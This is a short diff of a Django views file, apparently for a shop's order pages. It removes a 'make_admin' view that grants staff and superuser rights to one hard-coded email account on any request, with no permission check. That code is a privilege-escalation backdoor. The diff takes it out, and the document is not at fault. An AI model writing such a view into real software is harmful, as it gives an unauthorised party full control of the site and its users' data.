@@ -722,13 +722,3 @@ def order_detail(request, order_id):
             "order_items": order_items
         }
     )
-    from django.contrib.auth.models import User
-from django.http import HttpResponse
-
-def make_admin(request):
-    user = User.objects.get(username="vino@gmail.com")
-    user.is_staff = True
-    user.is_superuser = True
-    user.save()
-
-    return HttpResponse("Admin access updated successfully")
